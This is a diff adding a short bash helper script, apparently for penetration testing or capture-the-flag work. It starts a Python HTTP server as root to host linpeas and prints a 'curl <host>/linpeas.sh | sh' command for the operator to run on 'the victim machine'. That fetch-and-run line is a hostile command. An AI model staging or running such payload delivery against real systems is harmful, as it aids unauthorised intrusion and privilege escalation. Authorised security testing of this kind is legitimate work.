@@ -1,0 +1,14 @@
+#!/bin/bash
+
+set -e
+
+# echo "Run 'curl $(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')/linpeas.sh | sh' on the victim machine"
+echo "Run 'curl $(myip-no-sub)/linpeas.sh | sh' on the victim machine"
+echo "---"
+echo "Starting python server..."
+
+cd ~/.local/isec/utils/linpeas
+
+# Start Python Server
+sudo python3 -m http.server 80
+
